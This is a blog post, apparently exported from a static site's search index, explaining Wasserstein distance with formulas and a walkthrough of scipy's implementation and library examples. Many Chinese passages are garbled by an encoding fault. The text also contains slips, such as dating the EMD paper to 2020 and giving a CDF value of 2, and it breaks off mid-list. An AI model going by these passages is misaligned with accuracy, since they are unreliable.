<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Delve into Wasserstein Distance, principles and implementation analysis</title>
      <link href="/blog/2023/09/18/ml/wasserstein_dist/"/>
      <url>/blog/2023/09/18/ml/wasserstein_dist/</url>
      
        <content type="html"><![CDATA[<h2 id="wasserstein-distance">Wasserstein distance</h2><p>To understand Wasserstein distance fully, It's suggested to firstrecap the related background of probability theory, which can be seen inmy another blog <ahref="https://realyee.github.io/blog/2023/09/18/math/probabilities/wasserstein_bg/">Probabilitiesbackground for Wasserstein Distance</a></p><p>Wasserstein distance (also called Wasserstein distance,, optimaltransport) is a metric that quantifies the difference between twoprobability distributions, which is originally proposed in IJCV'2020ã€ŠThe Earth Mover's Distance as a Metric for Image Retrievalã€‹. It is anormalized measure of the minimum cost of turning one distribution intothe other, which can be used to measure the distance between twomulti-dimensional distributions. The cost is determined by the<strong>amount</strong> of "mass" that needs to be moved and the<strong>distance</strong> it needs to be moved.</p><h3 id="definitions">Definitions</h3><p><span class="math display">\[\begin{equation}W\left(\mathbb{P}_r, \mathbb{P}_g\right)=\inf _{\gamma \in\Pi\left(\mathbb{P}_r, \mathbb{P}_g\right)} \mathbb{E}_{(x, y) \sim\gamma}[\|x-y\|]\end{equation}\]</span></p><p><span class="math inline">\(\prod(\mathbb{P}_r,\mathbb{P}_g)\)</span> is the set of all joint distributions whosemarginals are <span class="math inline">\(P_r\)</span> and <spanclass="math inline">\(P_g\)</span>. The objective is find a jointdistribution <span class="math inline">\(\gamma \in \prod(\mathbb{P}_r,\mathbb{P}_g)\)</span> to minimizes the expectation of the distancebetween <span class="math inline">\(x\)</span> and <spanclass="math inline">\(y\)</span>. The distance <spanclass="math inline">\(||x-y||\)</span> can be defined as any distancemetric, such as Euclidean distance, etc. The minimum expection is theWasserstein distance between <span class="math inline">\(P_r\)</span>and <span class="math inline">\(P_g\)</span>.</p><p>For Discrete variables, the Wasserstein distance can be definedas:</p><p>Let</p><p>$$ <span class="math display">\[\begin{equation}\begin{aligned}P &amp;=\{(\mathbf{p}_1, w_{p_1}),(\mathbf{p}_2, w_{p_2}),(\mathbf{p}_3,w_{p_3}), \cdots,(\mathbf{p}_M, w_{p_M})\}, \\Q &amp;=\{(\mathbf{q}_1, w_{q_1}),(\mathbf{q}_2, w_{q_2}),(\mathbf{q}_3,w_{q_3}), \cdots,(\mathbf{q}_N, w_{q_N})\},\end{aligned}\end{equation}\]</span> $$</p><p>where <span class="math inline">\(p_i\)</span> is the <spanclass="math inline">\(i\)</span>-th point in <spanclass="math inline">\(P\)</span>, <spanclass="math inline">\(w_{p_i}\)</span> is the weight of <spanclass="math inline">\(p_i\)</span>, <spanclass="math inline">\(q_j\)</span> is the <spanclass="math inline">\(j\)</span>-th point in <spanclass="math inline">\(Q\)</span>, <spanclass="math inline">\(w_{q_j}\)</span> is the weight of <spanclass="math inline">\(q_j\)</span>. The <spanclass="math inline">\(d_{ij}\)</span> is the distance between <spanclass="math inline">\(P_i\)</span> and <spanclass="math inline">\(q_j\)</span>. The Wasserstein distance between<span class="math inline">\(P\)</span> and <spanclass="math inline">\(Q\)</span> is defined as:</p><p><span class="math display">\[\begin{equation}\begin{aligned}&amp; \min \sum_{i=1}^M \sum_{j=1}^N d_{i j} f_{i j} \\\text { s.t } &amp; \\&amp; f_{ij} \ge 0,\quad i=1,2, \cdots, M ; j=1,2, \cdots, N \\&amp; \sum_{j=1}^N f_{ij} \leq w_{p_i}, i=1,2, \cdots, M \\&amp; \sum_{i=1}^M f_{ij} \leq w_{q_j}, j=1,2, \cdots, N \\&amp; \sum_{i=1}^M \sum_{j=1}^N f_{ij}=\min \left\{\sum_{i=1}^M w_{p_i},\sum_{j=1}^M w_{p_j}\right\}\end{aligned}\end{equation}\]</span></p><p>EMD is proved to be distance(è·ç¦»å®šä¹‰å¿…é¡»æ»¡è¶³ä¸‰ç‚¹ï¼šæ­£å®šæ€§ï¼Œé½æ¬¡æ€§ï¼Œä¸‰è§’ä¸ç­‰å¼) in the originalpaper. Note that the sum of weight of two difference distribution can beunequal.</p><h3 id="two-equavalent-formulas">Two equavalent formulas</h3><p>The above definitions is all about optimization. In <ahref="https://arxiv.org/pdf/2111.03570.pdf">Why the 1-Wassersteindistance is the area between the two marginal CDFs</a> and <ahref="https://arxiv.org/abs/1509.02237">On Wasserstein Two SampleTesting and Related Families of Nonparametric Tests</a>, Two equavalentformulas of 1-Wasserstein distance is proved, which are more easily toimplement.</p><p>For quantile function,</p><p><span class="math display">\[\begin{equation}W_1(X, Y)=\int_{[0,1]}\left|F_X^{-1}(u)-F_Y^{-1}(u)\right| du\end{equation}\]</span></p><p>For cumulative ditribution function,</p><p><span class="math display">\[\begin{equation}W_1(u, v) = \int_{-\infty}^{+\infty} |U-V|\end{equation}\]</span></p><p>1-Wasserstein distance is the area between the two marginal empiricalCDFs</p><h3 id="three-intuitive-and-typical-examples">Three intuitive andtypical examples</h3><ol type="1"><li><p>Computing the distance of point clouds with differentdistribution</p><p>As show in the following figure, there are three point clouds withdifferent distribution, which one is closest to the other two? Blue andred? Red and green? Green and blue?</p><p>How to define a distance measure aligning with our intuition aboutthe geometry and distance of the point cloud? The solution is EarthMover's Distance (EMD)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/dot_cloud_emd.png"alt="point cloud for EMD" /><figcaption aria-hidden="true">point cloud for EMD</figcaption></figure></li><li><p>Assume the two probability distribution as dirt and hole, EMD isthe cost that needs to be done to move all the dirt to all theholes.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/dirt_hole_emd.png"alt="Move the earth to the hole" /><figcaption aria-hidden="true">Move the earth to the hole</figcaption></figure><p>Let us call the above point clouds as sample set A, B, C, which canbe regarded as a discrete probability distribution. For each sample<span class="math inline">\(x \in A\)</span>, there is <spanclass="math inline">\(p_x = \frac{1}{|A|}\)</span>, where |A| is thetotal number of points in sample set A. The distance between sample setA and B can be solved by the following linear program:</p><blockquote><p>recall probabilitiesï¼ša probability mass function (pmf) is a functionthat gives the probability that a discrete random variable is exactlyequal to some value. The probability density function (pdf) is used todescribe probabilities for continuous random variables. It'scounterpart.</p></blockquote><p>Each <span class="math inline">\(x \in A\)</span> corresponds to apile of dirt with height <span class="math inline">\(p_x\)</span>, andeach <span class="math inline">\(y \in B\)</span> corresponds to a holewith depth <span class="math inline">\(p_y\)</span>. The cost of movinga unit of dirt from x to y is the Euclidean distance between the twopoints, denoted as <span class="math inline">\(d(x, y)\)</span>. Let<span class="math inline">\(Z_{x,y}\)</span> represent the amount ofdirt moved from <span class="math inline">\(x \in A\)</span> to <spanclass="math inline">\(y \in B\)</span>, then the constraints are asfollows:</p><ul><li>Each <span class="math inline">\(Z_{x,y} \ge 0\)</span>, so dirt canonly moves from x to y.</li><li>Every pile <span class="math inline">\(x \in A\)</span> must vanish,i.e. for each fixed <span class="math inline">\(x \in A\)</span>, <spanclass="math inline">\(\sum_{y \in B} Z_{x,y} = p_x\)</span>.</li><li>Every hole <span class="math inline">\(y \in B\)</span> must becompletely filled, i.e. for each fixed <span class="math inline">\(y \inB\)</span>, <span class="math inline">\(\sum_{y \in B} Z_{x,y} =p_x\)</span></li></ul><p>The objective is to minimize the cost of moving the dirt, i.e. <spanclass="math inline">\(\sum_{x,y \in AxB}d(x,y)Z(x,y)\)</span>, subjectto the linear constraints:</p><p><span class="math display">\[\sum_{x, y \in A \times B}d(x, y)Z_{x,y} \\s.t \space\{     \begin{split}     &amp;Z_{x,y} \ge 0\\     &amp;\sum_{y \in B} Z_{x,y} = p_x\\     &amp;\sum_{x \in A} Z_{x,y} = p_y \\     \end{split}\}\]</span></p></li></ol><h2 id="python-tools-for-implementation">Python tools forimplementation</h2><p>Common used tools for Wasserstein distance implementation:</p><ol type="1"><li><a href="https://github.com/google/or-tools">google/or-tools:Google's Operations Research tools:</a>,</li><li>scipy,<code>from scipy.stats import wasserstein_distance</code></li><li><a href="https://pythonot.github.io/index.html">POT: Python OptimalTransport â€” POT Python Optimal Transport 0.9.0 documentation</a></li><li><a href="https://github.com/wmayner/pyemd">wmayner/pyemd: Fast EMDfor Python: a wrapper for Pele and Werman's C++ implementation of theEarth Mover's Distance metric</a></li></ol><p>An online tools to calculate Wasserstein distance: <ahref="https://demonstrations.wolfram.com/MongeKantorovichTransportationProblem/">Monge-KantorovichTransportation Problem - Wolfram Demonstrations Project</a></p><h3 id="scipy-1d-wasserstein-distance">scipy 1d Wassersteindistance</h3><p><code>scipy.stats.wasserstein_distance</code> applies to 1DWasserstein and directly uses L1 norm as the distance metric.</p><p>Definitions is the best way to learn: <ahref="https://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.wasserstein_distance.html#scipy-stats-wasserstein-distance">scipy.stats.wasserstein_distanceâ€” SciPy v1.11.1 Manual</a>:</p><blockquote><p>scipy.stats.wasserstein_distance(u_values, v_values, u_weights=Noneï¼Œv_weights=None) Compute the first Wasserstein distance between two 1Ddistributions.</p><p>This distance is also known as the earth moverâ€™s distance, since itcan be seen as the minimum amount of â€œworkâ€ required to transform <spanclass="math inline">\(u\)</span> into <spanclass="math inline">\(v\)</span>, where â€œworkâ€ is measured as the amountof distribution weight that must be moved, multiplied by the distance ithas to be moved.</p></blockquote><blockquote><p>u_values, v_values array_like</p><ul><li>Values observed in the (empirical) distribution.</li></ul><p>u_weights, v_weights array_like, optional</p><ul><li>Weight for each value. If unspecified, each value is assigned thesame weight. u_weights (resp. v_weights) must have the same length asu_values (resp. v_values). If the weight sum differs from 1, it muststill be positive and finite so that the weights can be normalized tosum to 1.</li></ul></blockquote><p>è§£é‡Šï¼š</p><ol type="1"><li><p>This function is for Wasserstein-1 distance, where the distanced(x,y) is the L1 norm, absolute value. It's only appliable to 1Ddistribution, which means 2D distribution should be flatten to1D.(especially for machine learning weights or images, which is 2Ddistribution or more)</p></li><li><p>u_values, v_values are the values observed in the (empirical)distribution, which is the samples drawed from the distribution.</p><p>Corresponding to the above example: the position coordinates of thepoint in the point cloud or the coordinates of dirt and holes.</p></li><li><p>u_weights, v_weights correspond to the weight of each sample inall samples.</p><p>Corresponding to the above example:</p><ol type="1"><li><p>The weighted number of points at this position in the point cloud(because it is a fraction with weighted sum is 1, so it is called theweighted number)</p></li><li><p>The weighted height, how much, and how deep the dirt and hole areat this position, that is, <span class="math inline">\(p_x\)</span>,<span class="math inline">\(p_y\)</span></p></li><li><p>If not specified, the default weights are equal on average. Ifspecified, it needs to be a positive integer and will be normalized to1</p></li></ol></li><li><p>Normally, The way to get wasserstein-1 distance is calculatingthe <strong>distance cost</strong> through u_values, v_values, calculate<strong>the quality or quantity</strong> through u_weights, v_weights,and then establish variables between each point from p to q samples tosolve the linear minimum optimization problem.</p></li></ol><h3id="scipy.stats.wasserstein_distance-sourcecode-analysis">scipy.stats.wasserstein_distancesourcecode analysis</h3><p>However, <strong>in the scipy function, the wasserstein distance iscalculated using the empirical CDFs related definitions in Equation7</strong></p><p>In function <code>scipy.stats.wasserstein_distance</code>, thefunction<code>_cdf_distance(1, u_values, v_values, u_weights, v_weights)</code>is called with <span class="math inline">\(p=1\)</span> as wasserstein-1distance.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">def _cdf_distance(p, u_values, v_values, u_weights=None, v_weights=None):</span><br><span class="line">    # validate whether it&#x27;s a distribution</span><br><span class="line">    u_values, u_weights = _validate_distribution(u_values, u_weights)</span><br><span class="line">    v_values, v_weights = _validate_distribution(v_values, v_weights)</span><br><span class="line"></span><br><span class="line">    # Sort u and v in ascending order and store the sorted indices</span><br><span class="line">    u_sorter = np.argsort(u_values)</span><br><span class="line">    v_sorter = np.argsort(v_values)</span><br><span class="line"></span><br><span class="line">    # concatenate the two samples and sort them in ascending order</span><br><span class="line">    all_values = np.concatenate((u_values, v_values))</span><br><span class="line">    all_values.sort(kind=&#x27;mergesort&#x27;)</span><br><span class="line"></span><br><span class="line">    # Compute the differences between pairs of successive values of u and v.</span><br><span class="line">    deltas = np.diff(all_values)</span><br><span class="line"></span><br><span class="line">    # Get the respective positions of the values of u and v among the values of</span><br><span class="line">    # both distributions.</span><br><span class="line">    u_cdf_indices = u_values[u_sorter].searchsorted(all_values[:-1], &#x27;right&#x27;)</span><br><span class="line">    v_cdf_indices = v_values[v_sorter].searchsorted(all_values[:-1], &#x27;right&#x27;)</span><br><span class="line"></span><br><span class="line">    # Calculate the CDFs of u and v using their weights, if specified.</span><br><span class="line">    if u_weights is None:</span><br><span class="line">        u_cdf = u_cdf_indices / u_values.size</span><br><span class="line">    else:</span><br><span class="line">        u_sorted_cumweights = np.concatenate(([0],</span><br><span class="line">                                              np.cumsum(u_weights[u_sorter])))</span><br><span class="line">        u_cdf = u_sorted_cumweights[u_cdf_indices] / u_sorted_cumweights[-1]</span><br><span class="line"></span><br><span class="line">    if v_weights is None:</span><br><span class="line">        v_cdf = v_cdf_indices / v_values.size</span><br><span class="line">    else:</span><br><span class="line">        v_sorted_cumweights = np.concatenate(([0],</span><br><span class="line">                                              np.cumsum(v_weights[v_sorter])))</span><br><span class="line">        v_cdf = v_sorted_cumweights[v_cdf_indices] / v_sorted_cumweights[-1]</span><br><span class="line"></span><br><span class="line">    # Compute the value of the integral based on the CDFs.</span><br><span class="line">    # If p = 1 or p = 2, we avoid using np.power, which introduces an overhead</span><br><span class="line">    # of about 15%.</span><br><span class="line">    if p == 1:</span><br><span class="line">        return np.sum(np.multiply(np.abs(u_cdf - v_cdf), deltas))</span><br><span class="line">    if p == 2:</span><br><span class="line">        return np.sqrt(np.sum(np.multiply(np.square(u_cdf - v_cdf), deltas)))</span><br><span class="line">    return np.power(np.sum(np.multiply(np.power(np.abs(u_cdf - v_cdf), p),</span><br><span class="line">                                       deltas)), 1/p)</span><br></pre></td></tr></table></figure><p>To illustrate the above code, let's take a look at the followingexample,</p><p><code>scipy.stats.wasserstein_distance(u_values=np.array([2, 10, 6]), v_values=np.array([12, 4, 2]))</code>with CDF figure as follows: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/emd_example.jpg"alt="emd_example" /></p><ol type="1"><li><p>Find the cutoff point for CDF</p><p><code>all_values = [2, 2, 4, 6, 10, 12]</code></p><p>Merging the lists of u and v is equivalent to marking the positionsof the values of two distribution on the coordinate axis, which is alsothe point of the Empircal CDF difference between the twodistribution.</p></li><li><p>Get the CDF of each distribution</p><ol type="1"><li><p>sort the two distribution in ascending order,<code>u_values[u_sorter]=[2, 6, 10], v_values[v_sorter] = [2, 4, 12]</code></p></li><li><p>find the number of samples less than <spanclass="math inline">\(x_i\)</span>, and than divide the size ofdistribution</p><p><span class="math display">\[\begin{equation}F_n(x_t) = \frac{\text{number of elements in the samples} \le x_t}{n} =\frac{1}{n}\sum_{i=1}^n I_{x_i \le x_t},\end{equation}\]</span></p></li></ol><p><code>u_cdf_indices = [1, 1, 1, 2, 3], v_cdf_indices= [1, 1, 2, 2, 2]</code></p><p>CDF = <code>u_cdf_indices / u_values.size</code></p><p>number of elements less than <span class="math inline">\(x_i\)</span>=<code>u_values[u_sorter].searchsorted(all_values[:-1], 'right')</code>.Due to the discrete nature, scipy get the CDF of the cutoff points (CDFdifferent places) through the above code (Actually, we can calculate theCDF value at any discrete coordinate, but it's unnecessary; we only needto compute it for the cutoff coordinates). For instance, for the 3rdcutoff element <span class="math inline">\(x_i = 4\)</span>, it find thenumber of elements less than <span class="math inline">\(x_i =4\)</span> in <code>u_values[u_sorter]</code>, which is the <spanclass="math inline">\(F_X(x_i=4) * size(u\_values)\)</span>.</p><p>Although the cutoff point coordinate can be repeated, the distancebetween the two repeated points is 0, so it does not affect thecalculation of the distance.</p></li><li><p>Get the CDF value differences of two distribution as theprobability 'mass' in <span class="math inline">\(x\)</span>.</p><p><code>np.abs(u_cdf - v_cdf)</code>: the difference of empirical CDFvalues at the cutoff points, which is the probability 'mass' in <spanclass="math inline">\(x\)</span>.</p></li><li><p>Get the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span>.</p><p><code>deltas = np.diff(all_values)</code>: the distance between twocutoff points, which is the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span>.</p></li><li><p>Sum the multiplication of the above two values in terms of <spanclass="math inline">\(x\)</span></p><p>For instance, when <span class="math inline">\(4 \le x_i \lt6\)</span>,</p><p><span class="math inline">\(F_X(4)\)</span> = u_cdf(<spanclass="math inline">\(X \le x_i\)</span>) = u_cdf[2] = 1</p><p><span class="math inline">\(F_Y(4)\)</span> = v_cdf(<spanclass="math inline">\(Y \le x_i\)</span>) = v_cdf[2] = 2$</p><p><code>delta[2] =all_values[3] - all_values[2] =6-4=2</code></p><p>According to Equation 7, the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span> in <spanclass="math inline">\(F(4)\)</span> is <spanclass="math inline">\(2*|1-2| = 2\)</span>.</p></li></ol><p>Recommend for Corresponding Python code: <ahref="https://blog.csdn.net/weixin_44589540/article/details/129720028">Pythonè®¡ç®—ç´¯ç§¯åˆ†å¸ƒå‡½æ•° CDF å¹¶ç»˜å›¾_python cdf å‡½æ•°-CSDN åšå®¢</a></p><h2 id="more-examples-and-tests-for-other-libraries">More Examples andTests for other libraries</h2><h3 id="scipy-use-cases">scipy use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line"></span><br><span class="line">def wassersteindist(n):</span><br><span class="line">    a = np.random.randn(n)</span><br><span class="line">    b = np.random.randn(n)</span><br><span class="line">    w = wasserstein_distance(a,b)</span><br><span class="line">    return w</span><br><span class="line"></span><br><span class="line">print(np.mean([wassersteindist(100) for r in range(1000)]))</span><br><span class="line">print(np.mean([wassersteindist(1000) for r in range(1000)]))</span><br><span class="line">print(np.mean([wassersteindist(10000) for r in range(1000)]))</span><br><span class="line"># OUTPUT</span><br><span class="line"># 0.17644314409413253</span><br><span class="line"># 0.05818221578545196</span><br><span class="line"># 0.018522773678086024</span><br></pre></td></tr></table></figure><p>è§£è¯»ï¼šnp.random.randn è¿”å›æ ‡å‡†æ­£æ€åˆ†å¸ƒ(mean=0, std=1, Gaussiandistribution) çš„é‡‡æ ·, a, béƒ½æ˜¯åŒä¸€åˆ†å¸ƒçš„é‡‡æ ·ç‚¹ã€‚å¯¹äºåŒä¸€åˆ†å¸ƒé‡‡æ ·ç‚¹æ¥è¯´ï¼Œæ ·æœ¬é‡è¶Šå¤§è¶Šæ¥è¿‘å…¶åˆ†å¸ƒï¼Œè€ŒäºŒè€…åˆ†å¸ƒä¸€æ ·ï¼Œå› æ­¤äºŒè€…çš„wasserstein distance éšç€æ ·æœ¬é‡é€æ¸å¢å¤§ä¼šè¶‹è¿‘äº 0ã€‚</p><p>Wassersteinè·ç¦»æ˜¯ä¸€ç§ç”¨äºè¡¡é‡ä¸¤ä¸ªæ¦‚ç‡åˆ†å¸ƒä¹‹é—´è·ç¦»çš„æ–¹æ³•ï¼Œå®ƒè€ƒè™‘äº†åˆ†å¸ƒä¹‹é—´çš„ç›¸ä¼¼æ€§å’Œå‡ ä½•è·ç¦»ä¹‹é—´çš„å…³ç³»ã€‚å®ƒæœ‰è®¸å¤šåº”ç”¨ï¼Œä¾‹å¦‚ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆGANï¼‰ä¸­çš„æŸå¤±å‡½æ•°å’Œå›¾åƒæ£€ç´¢ä¸­çš„ç›¸ä¼¼æ€§åº¦é‡ã€‚</p><p>Wassersteinè·ç¦»çš„å®šä¹‰åŸºäºæœ€å°åŒ–å°†ä¸€ä¸ªåˆ†å¸ƒè½¬æ¢ä¸ºå¦ä¸€ä¸ªåˆ†å¸ƒæ‰€éœ€çš„æˆæœ¬ã€‚æˆæœ¬å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œä½†é€šå¸¸æ˜¯æŒ‡å°†ä¸€ä¸ªåˆ†å¸ƒä¸­çš„è´¨é‡ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®æ‰€éœ€çš„æˆæœ¬ã€‚è¿™ä¸ªæˆæœ¬å¯ä»¥è¡¨ç¤ºä¸ºä¸¤ä¸ªä½ç½®ä¹‹é—´çš„è·ç¦»å’Œè´¨é‡çš„ä¹˜ç§¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line"></span><br><span class="line">a, b = [2,1,3,4], [4,1,2,4]</span><br><span class="line">w = wasserstein_distance(a,b)</span><br><span class="line">print(w)</span><br></pre></td></tr></table></figure><h3 id="wasserstein-p-distance">Wasserstein-p distance</h3><p>å¦‚æœè¦è®¡ç®— p-Wasserstein distance between two 1d distributions,ä¹Ÿå°±æ˜¯ä»¥ p èŒƒæ•°ä¸ºè·ç¦»è¡¡é‡çš„ wasserstein distanceï¼Œé‚£ scipyçš„åŠŸèƒ½å°±ä¸è¡Œäº†ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ <ahref="https://github.com/PythonOT/POT">PythonOT/POT: POT : PythonOptimal Transport</a>çš„åº“å‡½æ•°ï¼š<code>ot.wasserstein_1d(u_values, v_values, u_weights=None, v_weights=None, p=1, require_sort=True)</code>,ç›´æ¥æŒ‡å®š p èŒƒæ•°çš„å€¼å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import ot</span><br><span class="line">pos_p, pos_q = np.array([0, 5]), np.array([0, 1])</span><br><span class="line">counts_p, counts_q = np.array([3/4, 1/4]), np.array([1/2, 1/2])</span><br><span class="line">ot.backend = &#x27;numpy&#x27;</span><br><span class="line"></span><br><span class="line">ot.wasserstein_1d(pos_p, pos_q, u_weights=counts_p, v_weights=counts_q, p=2, require_sort=True)</span><br></pre></td></tr></table></figure><h2id="difference-between-implementations-of-scipy-potand-pyemd">Differencebetween implementations of scipyï¼Œ POTï¼Œand pyemd</h2><p>è¿™é‡Œæ¯”è¾ƒ scipy å’Œ POT çš„ wasserstein å‡½æ•°å’Œ pyemdç­‰åº“å®ç°çš„å·®å¼‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.stats.wasserstein_distance(u_values, v_values, u_weights=Noneï¼Œ v_weights=None)</span><br></pre></td></tr></table></figure><p>åœ¨ scipy ä¸­ï¼Œu_values, v_values å‚æ•°æ˜¯ä»åˆ†å¸ƒä¸­é‡‡æ ·çš„æ¯ä¸ªæ ·æœ¬ä½ç½®(samples drawed from distribution) ï¼Œå› æ­¤æ— é¡ºåºå¯é‡å¤ï¼ˆå®é™…ä¸Šçœ‹å‡½æ•°æºç å¯ä»¥çœ‹åˆ°å¯¹å…¶è¿›è¡Œæ’åºï¼Œä¹Ÿå¯ä»¥è¯´æ˜å…¶æ— é¡ºåºï¼‰ï¼Œu_weight,v_weight å¯¹åº”æƒé‡ï¼Œè´¨é‡ã€‚scipyè¿™ç§å…¶å®å¯¹æœºå™¨å­¦ä¹ ä¸­çŸ©é˜µï¼ˆéƒ½æ˜¯æ ·æœ¬ï¼‰çš„è·ç¦»è®¡ç®—æŒºæ–¹ä¾¿çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyemd.emd(first_histogram,</span><br><span class="line">    second_histogram,</span><br><span class="line">    distance_matrix,</span><br><span class="line">    extra_mass_penalty=-1.0)</span><br></pre></td></tr></table></figure><p>pyemd ä¸­ï¼Œfirst_histogramï¼Œsecond_histogram æ˜¯åˆ†å¸ƒçš„é¢‘ç‡å‘é‡ï¼ˆpre-computed frequency vector about the distributionæˆ–è€…ä¹Ÿå¯ä»¥è¯´æ˜¯é¢‘ç‡å‘é‡ï¼Œmass é‡é‡ï¼Œæƒé‡ï¼Œå¯¹åº” scipy ä¸­çš„ u_weight,v_weight, å¹¶é€šè¿‡ distance_matrix æŒ‡å®šè·ç¦»çŸ©é˜µ specifying distancesbetween bins.</p><p>å› æ­¤ï¼Œscipy ä¸ pyemd ä¹‹é—´çš„å·®å¼‚åœ¨äºå‚æ•°é¡ºåºä»¥åŠ ä½ç½®å’Œè·ç¦»</p><p>è®¡ç®—ä¸¤ä¸ªçŸ©é˜µä¹‹é—´çš„è·ç¦»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line">import numpy as np</span><br><span class="line">a = np.array([[3,4], [6,1]])</span><br><span class="line">b = np.array([[68,1], [921,4]])</span><br><span class="line">len = a.size</span><br><span class="line">wasserstein_distance(np.arange(len), np.arange(len), a.flatten(), b.flatten())</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.6438631790744466</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import pyemd</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def dist_matrix(len):</span><br><span class="line">    dist = np.empty((len, len))</span><br><span class="line">    for i in range(len):</span><br><span class="line">        for j in range(len):</span><br><span class="line">            dist[i][j] = abs(i-j)</span><br><span class="line">    return dist</span><br><span class="line"></span><br><span class="line">a = np.array([[3,4], [6,1]])</span><br><span class="line">b = np.array([[68,1], [921,4]])</span><br><span class="line">freq = lambda x: x.flatten() / np.sum(x) # compute the normalized histogramã€frequency of each element</span><br><span class="line"></span><br><span class="line">pyemd.pyemd.emd(freq(a), freq(b), dist_matrix(a.size)) # cost of moving mass under L1 is constant</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUTPUT: 0.643861793763</span><br></pre></td></tr></table></figure><p>çœ‹å¾—å‡ºæ¥ç›´æ¥è®¡ç®—çŸ©é˜µçš„è·ç¦»çš„è¯ï¼Œç”¨ scipyè¿˜æ˜¯æŒºæ–¹ä¾¿çš„ï¼Œä¾¿äºåœ¨æœºå™¨å­¦ä¹ ä¸­åº”ç”¨ã€‚</p><h2 id="applications-in-machine-learning">Applications in MachineLearning</h2><ol type="1"><li>Image Generation and Style Transfer, åœ¨ç”Ÿæˆå¯¹æŠ—ç½‘ç»œ GANä¸­ï¼Œæµ‹é‡çœŸå®åˆ†å¸ƒä¸ç”Ÿæˆåˆ†å¸ƒä¹‹é—´çš„è·ç¦»ï¼Œæ¥æ„æˆç›®æ ‡å‡½æ•°ï¼Œè®­ç»ƒGANï¼Œæé«˜ç”Ÿæˆå›¾ç‰‡çš„è´¨é‡</li><li>Domain Adaptation,é‡åŒ–æºåŸŸä¸ç›®æ ‡åŸŸçš„æ¦‚ç‡åˆ†å¸ƒå·®å¼‚ï¼Œä»è€Œè°ƒæ•´æºåŸŸä¸Šè®­ç»ƒçš„æ¨¡å‹</li><li>Outlier 